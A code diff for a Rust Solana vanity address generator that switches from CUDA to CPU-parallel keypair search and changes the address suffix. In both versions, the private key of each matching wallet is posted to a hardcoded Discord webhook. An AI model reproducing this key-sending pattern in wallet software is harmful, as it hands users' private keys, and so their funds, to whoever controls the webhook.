@@ -1,11 +1,7 @@
-mod cuda_helpers;
-mod cuda;
-
 use std::time::Instant;
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use colored::*;
-use cuda_helpers::CudaDevice;
 use solana_sdk::signature::{Keypair, Signer};
 use rayon::prelude::*;
 
@@ -13,14 +9,14 @@ const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/149724695368
 const BATCH_SIZE: usize = 100_000; // Parallel batch size
 
 const PREFIX: &str = "t";
-const SUFFIX: &str = "pump";
+const SUFFIX: &str = "mp";
 
 fn main() {
-    println!("{}", "\n🚀 Solana Prefix Address Generator".bright_cyan().bold());
+    println!("{}", "\n🚀 Solana Vanity Address Generator".bright_cyan().bold());
     println!(
         "{}",
         format!(
-            "Searching for addresses starting with '{}' (case-insensitive) and ending with '{}' (lowercase)",
+            "Searching for addresses starting with '{}' (case-insensitive) and ending with '{}' (case-sensitive)",
             PREFIX,
             SUFFIX
         )
@@ -28,22 +24,11 @@ fn main() {
     );
     println!("{}", "=" .cyan());
 
-    // Initialize CUDA
-    match CudaDevice::new() {
-        Ok(_device) => {
-            println!("{}", "✓ CUDA initialized".green());
-            println!("{}", "Generating keypairs continuously (parallel mode)...".green().bold());
-            println!("{}", "=" .cyan());
-            
-            // Start continuous generation
-            generate_pump_addresses_parallel();
-        },
-        Err(e) => {
-            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
-            eprintln!("{}", "Make sure you have NVIDIA GPU with CUDA 13.0+ installed".yellow());
-            std::process::exit(1);
-        }
-    }
+    println!("{}", "✓ CPU parallel generation enabled".green());
+    println!("{}", "Generating keypairs continuously...".green().bold());
+    println!("{}", "=" .cyan());
+
+    generate_pump_addresses_parallel();
 }
 
 fn generate_pump_addresses_parallel() {
@@ -57,40 +42,41 @@ fn generate_pump_addresses_parallel() {
         let batch_total = Arc::clone(&total_attempts);
         let batch_found = Arc::clone(&matches_found);
 
-        // Generate batch in parallel
-        let results: Vec<(String, String, bool)> = (0..BATCH_SIZE)
+        // Generate a batch in parallel and only materialize matches.
+        (0..BATCH_SIZE)
             .into_par_iter()
             .map(|_| {
                 let keypair = Keypair::new();
                 let address = keypair.pubkey().to_string();
-                let private_key = bs58::encode(keypair.to_bytes()).into_string();
-                let address_lower = address.to_lowercase();
-                let starts_with_prefix = address_lower.starts_with(PREFIX);
+                let starts_with_prefix = address
+                    .chars()
+                    .next()
+                    .map_or(false, |c| c.eq_ignore_ascii_case(&'t'));
                 let ends_with_suffix = address.ends_with(SUFFIX);
-                let is_match = starts_with_prefix && ends_with_suffix;
-                (address, private_key, is_match)
-            })
-            .collect();
-
-        // Process results and send Discord notifications
-        for (address, private_key, is_match) in results {
-            batch_total.fetch_add(1, Ordering::Relaxed);
-            
-            if is_match {
-                batch_found.fetch_add(1, Ordering::Relaxed);
-                
-                println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
-                println!("   Private Key: {}", private_key.cyan());
-                
-                // Send to Discord
-                if let Err(e) = send_to_discord(&address, &private_key) {
-                    eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
+                if starts_with_prefix && ends_with_suffix {
+                    let private_key = bs58::encode(keypair.to_bytes()).into_string();
+                    Some((address, private_key))
                 } else {
-                    println!("{}", "   ✓ Sent to Discord".green());
+                    None
                 }
-                println!();
-            }
-        }
+            })
+            .for_each(|maybe_match| {
+                batch_total.fetch_add(1, Ordering::Relaxed);
+
+                if let Some((address, private_key)) = maybe_match {
+                    batch_found.fetch_add(1, Ordering::Relaxed);
+
+                    println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
+                    println!("   Private Key: {}", private_key.cyan());
+
+                    if let Err(e) = send_to_discord(&address, &private_key) {
+                        eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
+                    } else {
+                        println!("{}", "   ✓ Sent to Discord".green());
+                    }
+                    println!();
+                }
+            });
 
         // Log speed periodically
         let now = Instant::now();
